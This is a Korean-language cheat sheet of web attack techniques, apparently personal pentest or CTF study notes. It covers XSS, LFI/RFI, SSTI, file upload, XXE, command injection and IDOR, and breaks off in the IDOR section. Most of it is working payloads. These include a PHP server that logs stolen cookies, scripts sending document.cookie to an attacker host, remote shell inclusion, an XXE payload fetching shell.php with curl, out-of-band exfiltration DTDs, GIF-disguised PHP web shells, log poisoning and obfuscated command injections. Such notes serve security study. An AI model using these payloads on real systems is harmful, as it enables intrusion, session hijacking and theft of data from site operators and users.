# 웹 취약점 공격 기법 모음

<details><summary><strong>Encoding</strong></summary>

```bash
# 문자열을 URI 인코딩으로 변환
echo 'hi!' | jq -srR '@uri'

# 16진수 변환
echo 'hi!' | xxd -p -c 1000

# md5 변환
echo 'hi!' | md5sum
```

</details>

---
<details>
    <summary><strong>INPUT</strong></summary>

- `INPUT`란에 아래 페이로드를 테스트 해본 뒤 `SQLI`/`LFI`/`RFI`/`SSTI`/`XSS`/`COMMAND INJECTION` 테스트.
```bash
# 세미콜론 - 이전 명령과 관계없이 다음 명령 실행
127.0.0.1;whoami

# AND 연산자 - 이전 명령이 성공하면 다음 명령 실행
127.0.0.1&&whoami

# OR 연산자 - 이전 명령이 실패하면 다음 명령 실행
127.0.0.1||whoami

# 개행 문자 - 새 줄에서 명령 실행
127.0.0.1%0awhoami
```

- 파라미터를 공백으로 만든 뒤 어떻게 전달되는지 확인.
<img width="1548" height="472" alt="image" src="https://github.com/user-attachments/assets/2284e992-7dc2-4885-a5ad-4af0c9efe800" />

<br>
<br>

- 타입 검사가 제대로 되지 않을 경우 우회 가능.
<img width="1548" height="472" alt="image" src="https://github.com/user-attachments/assets/5abcfd91-a27d-4da9-9cd6-bf845c9213fd" />



    
</details>

---

<details>
<summary><strong>XSS (Cross-Site Scripting)</strong></summary>

## XSS (Cross-Site Scripting)

> 웹 애플리케이션에 악성 스크립트를 주입하여 사용자의 브라우저에서 실행시키는 공격 기법입니다.

> `HEADER`를 조작하여 `XSS`시도 가능.

### 기본 공격 페이로드

#### 스크립트 태그 기반
```html
<!-- 기본 alert 실행 - 현재 도메인 정보 확인 -->
<script>alert(window.origin)</script>

<!-- 쿠키 정보 탈취 -->
<script>alert(document.cookie)</script>

<!-- 단순 XSS 동작 확인 -->
<script>alert('XSS')</script>

<!-- 콘솔 로그 출력 - 디버깅 및 정보 수집 -->
<script>console.log(document.cookie)</script>
```

#### 이벤트 핸들러 기반
```html
<!-- 이미지 로드 실패 시 스크립트 실행 -->
<img src="" onerror=alert(window.origin)>
<img src=x onerror=alert(document.cookie)>

<!-- 다양한 이벤트 핸들러 활용 -->
<img src=x onload=alert('XSS')>          <!-- 이미지 로드 완료 시 -->
<body onload=alert('XSS')>               <!-- 페이지 로드 완료 시 -->
<input onfocus=alert('XSS') autofocus>   <!-- 자동 포커스 시 -->
<svg onload=alert('XSS')>                <!-- SVG 로드 시 -->
```

#### HTML 태그 속성 활용

```html
<!-- a 태그의 href 속성 - 클릭 유도 필요 -->
<a href="javascript:alert('XSS')">Click me</a>

<!-- iframe 활용 - 자동 실행 가능 -->
<iframe src="javascript:alert('XSS')"></iframe>
```

---

### Stored XSS (저장형 XSS)
> 악성 스크립트가 서버의 데이터베이스에 저장되어, 다른 사용자가 해당 페이지를 방문할 때마다 스크립트가 실행되는 공격입니다.
> 
> **주요 발생 위치:** 게시판, 댓글, 프로필, 사용자 입력이 저장되는 모든 곳

#### 공격 페이로드

```html
<!-- 현재 origin 정보를 alert로 출력 -->
<script>alert(window.origin)</script>

<!-- 쿠키 정보를 alert로 출력 - 세션 하이재킹 가능 -->
<script>alert(document.cookie)</script>

<!-- 인쇄 대화상자 호출 - 사용자 방해 -->
<script>print()</script>

<!-- 이후 모든 HTML을 평문으로 처리 (페이지 렌더링 중단) -->
<plaintext>
```
<img width="1106" height="94" alt="image" src="https://github.com/user-attachments/assets/d9fdaeb7-2eef-4bf8-9b50-1d10c952551f" />

---

### Reflected XSS (반사형 XSS)
> 공격자가 악성 스크립트가 포함된 URL을 만들어 피해자에게 전달하면, 피해자가 해당 링크를 클릭했을 때 서버가 URL의 파라미터를 검증 없이 응답 페이지에 그대로 반영하여 스크립트가 실행되는 공격입니다.
> 
> **주요 발생 위치:** 검색 쿼리, 에러 메시지, URL 파라미터가 화면에 출력되는 곳

#### 공격 페이로드

```html
<!-- 기본 스크립트 삽입 -->
<script>alert(window.origin)</script>
```

**공격 URL 예시:** 
```
http://example.com/search?q=<script>alert(window.origin)</script>
```
<img width="1414" height="94" alt="image" src="https://github.com/user-attachments/assets/e8ad87e9-20b1-4f92-83fc-284fc006087e" />

---

### DOM XSS (DOM 기반 XSS)
> 클라이언트 측 JavaScript 코드가 사용자 입력을 안전하지 않게 처리할 때 발생하는 XSS입니다. 
> 서버를 거치지 않고 브라우저의 DOM을 직접 조작하여 공격이 이루어집니다.

#### 취약한 JavaScript 함수들

```javascript
// 동적으로 HTML을 작성하는 함수들 - 사용자 입력을 필터링 없이 사용 시 취약
document.write()      // 문서에 직접 쓰기
DOM.innerHTML         // 요소의 HTML 내용 설정
DOM.outerHTML         // 요소 자체를 HTML로 교체
add()                 // 요소 추가
after()               // 요소 다음에 삽입
append()              // 요소 끝에 추가
```

**주의사항:** 이러한 함수들에 사용자 입력이 필터링 없이 전달되면 XSS 공격에 취약합니다.

---

### Advanced XSS 기법
> 외부 서버와 연동하여 쿠키를 탈취하거나, 복잡한 페이로드를 체이닝하는 고급 공격 기법입니다.

#### 1. 쿠키 탈취 서버 구축

**PHP 서버 측 코드 (index.php):**
```php
<?php
# 쿠키 정보를 받아서 cookies.txt 파일에 저장
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

**서버 실행:**
```bash
# PHP 내장 웹 서버를 80포트로 실행 (root 권한 필요)
sudo php -S 0.0.0.0:80
```

#### 2. 다양한 스크립트 삽입 페이로드

```html
<!-- 외부 스크립트 파일 로드 - 가장 기본적인 방법 -->
<script src=http://OUR_IP></script>

<!-- 따옴표로 속성 닫기 후 스크립트 삽입 -->
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>

<!-- JavaScript URI를 통한 스크립트 실행 - URL 인코딩 우회 가능 -->
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')

<!-- XMLHttpRequest를 이용한 스크립트 로드 - 비동기 요청 -->
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

<!-- jQuery를 이용한 스크립트 로드 - jQuery 사용 사이트에서 유용 -->
<script>$.getScript("http://OUR_IP")</script>
```

#### 3. 쿠키 탈취 스크립트 (script.js)

```javascript
// document.location을 이용한 리다이렉트 방식 - 사용자가 인지 가능
document.location='http://OUR_IP/index.php?c='+document.cookie;

// Image 객체를 이용한 백그라운드 전송 - 사용자가 인지하기 어려움 (권장)
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

#### 4. 공격 실행 예시

<img width="832" height="704" alt="image" src="https://github.com/user-attachments/assets/3aa72f40-1ead-4db1-8c05-68c42ad656cf" />

**공격 절차:**
1. 각각의 input 필드에 XSS 페이로드를 테스트
2. XSS 취약점이 있는 input을 식별
3. 해당 input에 `script.js`를 요청하는 페이로드 삽입
4. 피해자가 페이지를 방문하면 자동으로 쿠키가 공격자 서버로 전송됨

</details>

---

<details>
<summary><strong>LFI (Local File Inclusion)</strong></summary>

## LFI (Local File Inclusion)

> 웹 애플리케이션이 사용자 입력을 적절히 검증하지 않아 서버의 로컬 파일을 읽을 수 있는 취약점입니다.

### 기본 공격 기법

#### 공격 팁
- 최소한의 `../` 개수를 찾아서 사용할 것
- 에러 메시지 내용을 보고 경로를 유추할 수 있음
- 안될 시에 payload를 URL ENCODED로 시도해볼 것

#### 주요 타겟 파일
```bash
# Linux
/etc/passwd           # 시스템 사용자 정보
/etc/shadow           # 암호화된 패스워드 (권한 필요)
/proc/self/environ    # 환경 변수
/var/log/apache2/access.log  # 웹 서버 로그

# Windows
C:\Windows\boot.ini   # 부트 설정
C:\Windows\System32\drivers\etc\hosts  # hosts 파일
```

#### 기본 페이로드

```bash
# 기본 경로 탐색
http://<SERVER_IP>:<PORT>/index.php?language=etc/passwd
http://<SERVER_IP>:<PORT>/index.php?language=../../../etc/passwd

http://<SERVER_IP>:<PORT>/index.php?language=windows/win.ini
http://<SERVER_IP>:<PORT>/index.php?language=../../../windows/win.ini

# 절대 경로 시도
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd

http://<SERVER_IP>:<PORT>/index.php?language=/windows/win.ini
http://<SERVER_IP>:<PORT>/index.php?language=/../../../windows/win.ini

# 필터 우회 - 점과 슬래시 조합
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd

# URL 인코딩 우회
http://<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

# 접두사가 추가되는 경우
http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd

```

#### 접두사 추가
```bash
# 원본
http://10.129.23.214/department/manage.php?notes=files/ninevehNotes.txt

# 접두사 테스트
http://10.129.23.214/department/manage.php?notes=files/ninevehNotes/../../../../etc/passwd
http://10.129.23.214/department/manage.php?notes=/ninevehNotes/../../../../etc/passwd
```

#### 다양한 필터 우회 기법
```bash
..././           # 점 3개 슬래시
....\/           # 점 4개 백슬래시
....////         # 점 4개 슬래시 4개
%2e%2e%2f        # URL 인코딩
/etc/passwd%00   # Null byte 삽입 (PHP 5.3 이하)
```

#### 경로 길이 제한 우회 스크립트
```bash
# 점과 슬래시를 2048번 반복하여 경로 길이 제한 우회
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

#### Username을 이용한 LFI
```
예: 프로필 이미지 다운로드 URL이 /profile/$username/avatar.png 형식일 때
악의적인 username을 생성 (예: ../../../etc/passwd)
서버가 이를 검증하지 않으면 다른 파일에 접근 가능
```

---

### PHP Filters
> PHP의 stream filter를 이용하여 파일 내용을 인코딩하거나 변환하여 읽는 기법

#### Base64 인코딩을 통한 소스 코드 읽기
```bash
# PHP 설정 파일 읽기
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config

# 반환된 Base64 디코딩
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

**활용 사례:**
- PHP 소스 코드를 평문으로 읽을 수 없을 때 사용
- 데이터베이스 설정 파일, 인증 정보 탈취에 유용

---

### PHP Wrappers
> PHP의 다양한 wrapper를 이용한 코드 실행 기법

#### 전제 조건
```bash
# php.ini에서 allow_url_include 설정 확인
allow_url_include = On

# 설정 확인 명령
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

#### PHP 설정 파일 위치
```bash
# Apache 환경
/etc/php/X.Y/apache2/php.ini

# PHP-FPM 환경
/etc/php/X.Y/fpm/php.ini
```

#### data:// Wrapper
```bash
# Base64 인코딩된 PHP 코드 생성
# <?php system($_GET["cmd"]); ?>를 Base64로 인코딩
echo '<?php system($_GET["cmd"]); ?>' | base64
# 결과: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

# data:// wrapper를 통한 코드 실행
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
```

#### input:// Wrapper
```bash
# POST 데이터로 PHP 코드 전송 (GET 파라미터로 명령 실행)
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid

# POST 데이터로 직접 명령 실행
curl -s -X POST --data '<?php system("id"); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input"
```

#### Expect Wrapper
```bash
# php.ini에서 expect 확장 모듈 활성화 필요
extension=expect

# expect:// wrapper를 통한 명령 실행
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

---

### 로그 파일 포함 (Log Poisoning)
> 웹 서버 로그 파일에 악성 코드를 삽입한 후, LFI를 통해 해당 로그 파일을 포함시켜 코드를 실행하는 기법입니다.

#### 주요 로그 파일 위치
```bash
# Apache (Linux)
/var/log/apache2/access.log
/var/log/apache2/error.log

# Apache (Windows)
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log

# Nginx (Linux)
/var/log/nginx/access.log
/var/log/nginx/error.log

# Nginx (Windows)
C:\nginx\log\access.log
C:\nginx\log\error.log

# 기타 유용한 로그 파일
/proc/self/environ          # 환경 변수
/proc/self/fd/<pid>         # 파일 디스크립터
/var/log/sshd.log           # SSH 로그
/var/log/mail               # 메일 로그
/var/log/vsftpd.log         # FTP 로그
```

#### 공격 절차
1. **세션 ID 확인:** 브라우저 쿠키에서 `PHPSESSID` 값 확인
2. **세션 파일 위치 확인**
3. **세션 파일 읽기**
4. **세션에 악성 코드 삽입**
5. **세션 파일 실행**

---

### PHP 세션 파일 포함
> PHP 세션 파일에 악성 코드를 저장한 후 LFI로 포함시키는 기법입니다.

#### PHP 세션 파일 위치
```bash
# PHP 세션 파일 기본 위치
/var/lib/php/sessions/sess_<SESSION_ID>

# 예시
/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

#### 공격 예시
```bash
# 1. 세션 파일 읽기
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd

# 2. 세션에 데이터 저장 (정상적인 기능 사용)
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning

# 3. 세션 파일 다시 확인
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

**세션 poisoning 예시:**

<img width="2091" height="568" alt="image" src="https://github.com/user-attachments/assets/74a9ffbf-55d1-481f-9d8f-1f2308ebdcf6" />

```bash
# 4. 악성 PHP 코드를 세션에 삽입 (language 파라미터 사용)
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

# 5. 세션 파일을 포함시켜 명령 실행
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

---

### User-Agent를 이용한 Log Poisoning

- FreeBSD Apache Log file Location : `/var/log/httpd-error.log`

```bash
# 1. 악성 PHP 코드를 User-Agent에 삽입
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison

# 2. 커스텀 User-Agent로 요청 전송
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison

# 3. LFI를 통해 로그 파일 포함 및 명령 실행(access.log 파일에 명령어 실행.)
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
```

**Log poisoning 예시:**

<img width="1265" height="598" alt="image" src="https://github.com/user-attachments/assets/9673d26a-6ded-46df-8d67-b7b9e7bf1422" />


</details>

---

<details>
<summary><strong>RFI (Remote File Inclusion)</strong></summary>

## RFI (Remote File Inclusion)

- 외부 서버의 악성 파일을 포함시켜 실행하는 공격 기법입니다.
- 특정 파일까지 지정해줘야 제대로 읽어진다.
- `RFI`가 가능할 때 `Responder`를 사용하여 해시 캡쳐가 가능할 수 있다.

### 기본 RFI 공격

#### HTTP를 통한 원격 파일 포함
```bash
# 로컬 서버의 파일 포함 (테스트)
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php

# 공격자 서버의 악성 파일 포함
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

---

### FTP를 통한 원격 파일 포함
```bash
# FTP 서버 실행 (Python pyftpdlib 사용)
sudo python3 -m pyftpdlib -p 21

# FTP를 통한 파일 포함
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

---

### SMB를 통한 원격 파일 포함 (Windows)
```bash
# Impacket의 smbserver.py 실행(NTLM 해시 탈취 가능)
impacket-smbserver -smb2support share $(pwd)

# SMB를 통한 파일 포함
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

---


### Fuzzing을 통한 LFI/RFI 취약점 발견

#### 유용한 Wordlist

```bash
# LFI 페이로드 Wordlist
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

# Linux 웹 루트 디렉토리 Wordlist
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt

# Windows 웹 루트 디렉토리 Wordlist
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt

# Linux LFI Wordlist
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux

# Windows LFI Wordlist
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
```

#### GET 파라미터 퍼징
```bash
# GET 파라미터 퍼징 - 어떤 파라미터가 파일 포함에 취약한지 탐색
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' \
     -fs 2287
```

---

#### LFI Wordlist를 이용한 페이로드 테스트
```bash
# LFI 페이로드 퍼징 - 어떤 경로 조합이 유효한지 탐색
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' \
     -fs 2287
```

---

#### 웹 서버 루트 디렉토리 찾기
```bash
# 웹 루트 디렉토리 퍼징 - 서버의 웹 루트 경로 식별
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
     -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' \
     -fs 2287
```

---

#### 로그 파일 위치 찾기
```bash
# 로그 파일 퍼징 - 접근 가능한 로그 파일 탐색
ffuf -w ./LFI-WordList-Linux:FUZZ \
     -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' \
     -fs 2287
```

</details>

---

<details>
<summary><strong>SSTI (Server-Side Template Injection)</strong></summary>

## SSTI (Server-Side Template Injection)

- 템플릿 엔진이 사용자 입력을 안전하게 처리하지 않아 서버 측에서 임의 코드를 실행할 수 있는 취약점입니다.
- 서버에서 사용하는 언어에 따라서 페이로드가 달라진다.

### 기본 탐지 페이로드

#### 다양한 템플릿 엔진 테스트
```html
<!-- Jinja2, Twig (Python, PHP) -->
{{7*7}}

<!-- Mako, JSP (Python, Java) -->
${7*7}

<!-- ERB (Ruby) -->
<%= 7*7 %>

<!-- Freemarker (Java) -->
${{7*7}}

<!-- Thymeleaf (Java) -->
#{7*7}

<!-- Velocity (Java) -->
*{7*7}
```

**탐지 방법:**
- 위 페이로드를 입력했을 때 `49`가 출력되면 SSTI 취약점 존재
- 각 템플릿 엔진마다 다른 문법을 사용하므로 여러 페이로드 테스트 필요

---

### Node.js SSTI 공격

#### 특징
```javascript
// Node.js에서는 process 객체가 전역으로 존재
// child_process 모듈을 통해 시스템 명령 실행 가능
```

#### 명령 실행 페이로드
```javascript
// execSync를 이용한 동기 명령 실행 (권장)
process.mainModule.require('child_process').execSync('whoami')

// 다른 시스템 명령 예시
process.mainModule.require('child_process').execSync('cat /etc/passwd')
process.mainModule.require('child_process').execSync('ls -la')
```

**중요 사항:**
- SSTI 공격에서는 **동기(Synchronous) 함수**를 사용해야 응답을 받을 수 있음
- 비동기 함수(`exec`, `spawn` 등)는 결과를 즉시 반환하지 않아 공격에 부적합

</details>

---

<details>
<summary><strong>File Upload</strong></summary>

## File Upload

> 파일 업로드 기능의 취약점을 이용하여 악성 파일을 서버에 업로드하고 실행하는 공격 기법입니다.

### 클라이언트 사이드 검증 우회
- front에서 파일타입만 확인하는 경우 파일 이름과 내용을 바꿔서 서버로 전송(image.jpg -> ex.php)
- html 수정

<img width="1942" height="455" alt="image" src="https://github.com/user-attachments/assets/5be7d857-603b-4260-9a90-facf245bde4f" />

---

### 확장자 우회 기법

#### 유용한 Wordlist
```bash
# 다양한 웹 확장자 리스트
/usr/share/seclists/Discovery/Web-Content/web-extensions.txt

# PayloadsAllTheThings PHP 확장자 리스트
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

# Content-Type 리스트
/usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt
```

#### 확장자 변조 예시
```bash
shell.jpg.php     # 이중 확장자
shell.php.jpg     # 역순 이중 확장자
```

---

### 매직 바이트를 이용한 우회

#### GIF 매직 바이트
```php
GIF89a;
<?php system($_REQUEST['cmd']); ?>
```

```php
GIF87a;
<?php system($_REQUEST['cmd']); ?>
```

**원리:**
- 서버가 파일의 매직 바이트(파일 시그니처)만 확인하는 경우
- GIF 파일의 매직 바이트로 시작하면 이미지로 인식하지만 PHP 코드는 여전히 실행됨

---

### 파일명 조작을 통한 우회

#### 특수 문자 삽입 스크립트
```bash
# 다양한 특수 문자를 조합하여 필터 우회 시도
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

**활용 방법:**
- 생성된 wordlist를 ffuf나 Burp Suite로 테스트
- 서버의 파일명 파싱 로직 취약점을 찾아 우회

---

### SVG 파일을 이용한 공격

#### XSS가 포함된 SVG
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

**활용 사례:**
- SVG 파일은 XML 기반이므로 JavaScript 코드 포함 가능
- 이미지로 인식되어 업로드가 허용되지만 XSS 공격 가능
- XXE 공격과 결합 가능

</details>

---

<details>
<summary><strong>XXE (XML External Entity) 공격</strong></summary>

## XXE (XML External Entity) 공격

> XML 파서가 외부 엔티티를 처리할 때 발생하는 취약점을 이용한 공격입니다.

### 기본 XXE 공격

#### /etc/passwd 읽기
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

#### PHP 소스 코드 읽기 (Base64 인코딩)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=c:/users/daniel/.ssh/id_rsa">
<svg>&xxe;</svg>
```

---

### Advanced XXE 공격

#### DOCTYPE 선언 규칙
- `DOCTYPE`은 XML에서 한번만 선언될 수 있다.

```xml
<!DOCTYPE root [
  <!ENTITY entity1 "value1">
  <!ENTITY entity2 "value2">
  <!ENTITY entity3 "value3">
]>
```

#### 파일 시스템 접근
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

#### PHP Filter 활용
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

#### 원격 명령 실행 (Expect 확장 필요)
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```
<img width="1519" height="584" alt="image" src="https://github.com/user-attachments/assets/6b8534fb-d906-45a5-8db1-81a499d49926" />

---

### Out-of-Band (OOB) XXE

#### 외부 DTD를 이용한 데이터 추출
```bash
# 공격자 서버의 xxe.dtd 파일 생성
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
```

---

### Error Based XXE

<img width="1531" height="451" alt="image" src="https://github.com/user-attachments/assets/2dff7e87-5b48-4bac-a09b-be73493d0927" />
<img width="1291" height="330" alt="image" src="https://github.com/user-attachments/assets/6984084b-09fa-45e3-b415-787cfd41e662" />

---

### Blind XXE

#### PHP 스크립트로 데이터 수신
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
<img width="1157" height="398" alt="image" src="https://github.com/user-attachments/assets/e958cdff-ff72-4aee-b609-8f64214e9cd1" />

---

### 자동화 도구 (XXEinjector)

```bash
# XXEinjector 설치
git clone https://github.com/enjoiz/XXEinjector.git
```

#### 사용 방법
- request에서 xml부분을 지워줘야한다.

```xml
<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

```bash
# XXEinjector 실행
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

</details>

---

<details>
<summary><strong>Command Injection</strong></summary>

## Command Injection

> 사용자 입력이 시스템 명령으로 실행될 때 악의적인 명령을 주입하는 공격 기법입니다.

### 기본 우회 기법
- front에서만 처리되는 validation 해제하고 실행해보기. 혹은 burpsuite로 우회하기.

---

### 환경 변수를 이용한 문자 추출

#### Linux/Unix
```bash
# PATH 환경 변수의 첫 번째 문자 추출 (/)
echo ${PATH:0:1}

# HOME 환경 변수의 첫 번째 문자 추출
echo ${HOME:0:1}

# 현재 디렉토리의 첫 번째 문자 추출
echo ${PWD:0:1}

# LS_COLORS 환경 변수의 10번째 문자 추출
echo ${LS_COLORS:10:1}
```

#### Windows
```powershell
# HOMEPATH 환경 변수의 일부 추출
echo %HOMEPATH:~6,-11%

# PowerShell에서 환경 변수의 첫 번째 문자
$env:HOMEPATH[0]

# PowerShell에서 PROGRAMFILES의 10번째 문자
$env:PROGRAMFILES[10]
```

---

### 명령 체이닝

#### 기본 구분자
```bash
# 세미콜론 - 이전 명령과 관계없이 다음 명령 실행
127.0.0.1;whoami

# AND 연산자 - 이전 명령이 성공하면 다음 명령 실행
127.0.0.1&&whoami

# OR 연산자 - 이전 명령이 실패하면 다음 명령 실행
127.0.0.1||whoami

# 개행 문자 - 새 줄에서 명령 실행
127.0.0.1%0awhoami

# 개행 문자 + bash + tab(bash -c "whoami"#)
127.0.0.1%0abash%09-c%09%22whoami%22#
```

---

### 필터 우회 기법

#### 공백 우회
```bash
# 탭 문자 사용
127.0.0.1%0a%09whoami

# IFS (Internal Field Separator) 사용
127.0.0.1%0a${IFS}whoami

# Brace Expansion 사용
127.0.0.1%0a{ls,-al}

# 환경 변수와 IFS 조합
127.0.0.1${LS_COLORS:10:1}${IFS}
```

---

### 문자 필터 우회

#### 따옴표를 이용한 우회
```bash
# 작은따옴표로 문자 분리
127.0.0.1%0aw'h'o'am'i

# 큰따옴표로 문자 분리
127.0.0.1%0aw"h"o"am"i
```

#### Windows 대소문자 무시
```bash
# Windows는 대소문자를 구분하지 않음
127.0.0.1%0aWhOaMi
```

#### Windows PowerShell 역순 실행
```powershell
# 문자열을 역순으로 배열한 후 실행
127.0.0.1%0aiex "$('imaohw'[-1..-20] -join '')"

# Base64 인코딩 우회
127.0.0.1%0a[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

#### Linux 문자열 변환
```bash
# 대문자를 소문자로 변환
127.0.0.1%0a$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

# 문자열 역순 실행
127.0.0.1%0a$(rev<<<'imaohw')

# Base64 디코딩 후 실행
127.0.0.1%0abash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

</details>

---

<details>
<summary><strong>Bypassing Basic Authentication</strong></summary>

## Bypassing Basic Authentication

> HTTP 기본 인증을 우회하는 다양한 기법입니다.

### HTTP 메서드 변조

#### OPTIONS 메서드 확인
```bash
# 서버가 지원하는 HTTP 메서드 확인
curl -i -X OPTIONS http://SERVER_IP:PORT/
```

**활용 방법:**
- 특정 기능에 대한 권한이 없을 때 request method를 변경해서 시도
- GET에서 POST로, POST에서 PUT으로 변경
- `burpsuite` : `change request method` 기능 활용

**예시:**
- GET 요청이 막혔을 때 POST로 변경
- DELETE 권한이 없을 때 POST나 PUT 시도
- HEAD 메서드로 정보 수집

</details>

---

<details>
<summary><strong>IDOR</strong></summary>

## IDOR (Insecure Direct Object Reference)

> 사용자가 접근 권한 없는 객체에 직접 참조하여 접근할 수 있는 취약점입니다.

> `ffuf`를 사용하여 `Username` fuzzing 가능.

### 기본 공격 기법

#### URL 파라미터 조작
```
# uid 파라미터를 변경하여 다른 사용자의 문서 접근
http://SERVER_IP:PORT/documents.php?uid=<change>
```


**공격 절차:**
1. API method 변경해서 시도해보기 (GET → POST, PUT, DELETE)
2. 파라미터 값을 순차적으로 변경하며 테스트
3. 인코딩된 값이 있다면 디코딩하여 규칙 파악

---

### 자동화 스크립트

#### 문서 링크 추출 및 다운로드
```bash
# 특정 uid의 문서 링크 추출
